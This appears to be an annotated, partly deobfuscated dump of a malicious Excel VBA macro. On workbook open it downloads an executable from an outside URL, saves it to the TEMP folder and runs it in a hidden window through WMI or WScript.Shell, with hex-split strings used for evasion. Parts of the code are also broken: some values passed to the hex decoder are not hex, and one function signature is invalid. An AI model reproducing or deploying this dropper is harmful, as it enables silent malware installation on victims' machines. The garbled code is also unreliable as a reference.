Attribute VB_Name = "wuandjrdh"

# Run command with wscript.shell

Sub Run_Cmdline(cmdLine As String)
CreateObject(Hexa_to_utf8("WScript.She") & Hexa_to_utf8("ll")).Run cmdLine, 0
End Sub

--------------------------

Attribute VB_Name = "lfpcaytbq"

Sub Execute_file(Filename As String)
On Error Resume Next
Err.Clear
wimResult = Spawn_Process(Filename)

# If execution with Execute_file fail,
# go execute wscript.shell

If Err.Number <> 0 Or wimResult <> 0 Then
Err.Clear
Run_Cmdline Filename
End If

On Error GoTo 0
End Sub

---------------------

# Convert Hexa to UTF-8

Attribute VB_Name = "elwxtqpty"

Function Hexa_to_utf8(Arg_1 Arg_2 As String) As String
Dim Var_C As Long
For Var_C = 1 To Len(Arg_2) Step 2
Hexa_to_utf8 = Hexa_to_utf8 & Chr$(Val("&H" & Mid$(Arg_2, Var_C, 2)))
Next Var_C
End Function

---------------------------------------

Attribute VB_Name = "blybvzjfm"

# Execute a process in a hidden window

Function Spawn_Process(Process As String) As Integer
Dim objConfig As Object
Dim objProcess As Object
Set objWMIService = GetObject(Hexa_to_utf8("winmgmts:\\.\ro") & Hexa_to_utf8("ot\cimv2"))
Set objStartup = objWMIService.Get(Hexa_to_utf8("Win32_Pr") & Hexa_to_utf8("ocessStartup"))
Set objConfig = objStartup.SpawnInstance_
objConfig.ShowWindow = 0
Set objProcess = GetObject(Hexa_to_utf8("winmgmts:\\.\root\cimv2:") & Hexa_to_utf8("Win32_Process"))
Spawn_Process = Priv_func_0(objProcess, objConfig, Process)
End Function

Private Function Priv_func_0(objProcess As Object, objConfig As Object, Process As String) As Integer
Dim Priv_Var_A As Long
Priv_func_0 = objProcess.Create(Process, Null, objConfig, Priv_Var_A)
End Function

------------------------

# Download file
# Save it to disk
# Execute it 

Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True

Private Sub Download_exe()
Dim url As String
Dim filename As String
Dim http_request_obj As Object, Stream As Object
Dim Var_G As Integer
url = Hexa_to_utf8("https://p.kwi.ski/exa") & Hexa_to_utf8("m/5b4c219a1af8530c78f2a577.exe")
filename = Hexa_to_utf8("dropped") & Hexa_to_utf8(".exe")
filename = Environ("TEMP") & "\" & filename
Set http_request_obj = CreateObject(Hexa_to_utf8("MSXML2.Ser") & Hexa_to_utf8("verXMLHTTP.6.0"))
http_request_obj.setOption(2) = 13056
http_request_obj.Open Hexa_to_utf8("474554"), url, False
http_request_obj.setRequestHeader Hexa_to_utf8("User-A") & Hexa_to_utf8("gent"), Hexa_to_utf8("Mozilla/4.0 (compatible; MSI") & Hexa_to_utf8("E 6.0; Windows NT 5.0)")
http_request_obj.Send
If http_request_obj.Status = 200 Then
Set Stream = CreateObject(Hexa_to_utf8("ADODB.St") & Hexa_to_utf8("ream"))
Stream.Open
Stream.Type = 1
Stream.Write http_request_obj.ResponseBody
Stream.SaveToFile filename, 2
Stream.Close
Execute_file filename
End If
End Sub

Sub Workbook_Open()
Download_exe
End Sub

